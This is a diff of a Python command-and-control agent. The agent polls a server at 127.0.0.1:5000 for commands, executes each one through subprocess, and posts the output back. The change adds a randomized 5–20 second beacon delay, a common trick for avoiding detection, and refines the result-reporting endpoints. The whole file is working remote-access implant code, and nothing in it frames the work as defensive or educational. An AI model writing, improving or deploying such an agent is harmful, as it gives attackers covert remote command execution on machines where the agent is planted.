@@ -11,10 +11,11 @@ Agent robi:
 import time
 import subprocess
 import requests
+import random
 
 SERVER_IP = "127.0.0.1"
 PORT = 5000
-SERVER_URL = f"http://{SERVER_IP}:{PORT}"
+SERVER_URL = f"http://{SERVER_IP}:{PORT}/a"
 
 def main():
     while True:
@@ -22,14 +23,17 @@ def main():
             result = requests.get(f"{SERVER_URL}/tasks", timeout=10)
             json = result.json()
             command = json.get("cmd", None)
-        except:
+        except KeyboardInterrupt:
+            raise
+        except Exception:
             continue
         if command:
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = process.communicate()
-            print(out.decode(), type(out.decode()))
-            requests.post(f"{SERVER_URL}/completed", json={"stdout": out.decode(), "stderr": err.decode()}, headers={"Content-Type": "application/json"})
-        time.sleep(1)
+            requests.post(f"{SERVER_URL}/result", json={"id": json["id"], "stdout": out.decode(), "stderr": err.decode()}, headers={"Content-Type": "application/json"})
+
+        sleep_time = random.randint(5, 20)
+        time.sleep(sleep_time)
 
 if __name__ == "__main__":
     main()
